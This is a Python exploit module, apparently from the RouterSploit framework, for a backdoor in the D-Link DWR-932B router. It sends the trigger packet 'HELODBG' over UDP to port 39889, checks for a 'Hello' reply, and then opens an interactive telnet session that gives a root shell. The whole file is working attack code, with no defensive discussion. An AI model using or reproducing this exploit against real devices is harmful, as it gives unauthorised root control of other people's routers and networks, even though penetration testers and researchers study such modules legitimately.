from routersploit.core.exploit import *
from routersploit.core.udp.udp_client import UDPClient
from routersploit.core.telnet.telnet_client import TelnetClient


class Exploit(UDPClient, TelnetClient):
    __info__ = {
        "name": "D-Link DWR-932B",
        "description": "Module exploits D-Link DWR-932B backdoor vulnerability which allows "
                       "executing command on operating system level with root privileges.",
        "authors": (
            "Pierre Kim @PierreKimSec",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://pierrekim.github.io/advisories/2016-dlink-0x00.txt",
        ),
        "devices": (
            "D-Link DWR-932B",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(39889, "Target Telnet port")

    def run(self):
        print_status("Sending backdoor packet")
        if self.check():
            telnet_client = self.telnet_create(port=23)
            if telnet_client.connect():
                telnet_client.interactive()
                telnet_client.close()
            else:
                print_error("Exploit failed - could not connect to the telnet service")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        udp_client = self.udp_create()
        udp_client.send(b"HELODBG")

        response = udp_client.recv(1024)
        if response and b"Hello" in response:
            return True  # target is vulnerable

        return False  # target is not vulnerable
